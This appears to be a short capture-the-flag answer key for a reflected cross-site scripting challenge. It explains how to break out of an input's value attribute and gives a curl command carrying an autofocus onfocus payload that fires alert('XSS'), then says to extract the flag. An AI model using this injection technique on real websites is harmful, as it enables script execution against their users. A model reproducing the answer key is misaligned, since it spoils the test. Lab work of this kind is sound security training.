# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Reflected XSS into an `<input value="...">` attribute. Break out of
the attribute and add `autofocus onfocus=...`. A headless browser renders the
page (firing focus on autofocus elements) and returns the flag only if
`alert('XSS')` fires.

1. **Submit the attribute-breakout `onfocus` payload:**

   ```
   curl -s -G "http://<target>/page" \
     --data-urlencode "name=\" autofocus onfocus=\"alert('XSS')"
   ```

2. **Extract the flag** (`FLAG{...}`) from the response once the check passes, and
   report it verbatim.
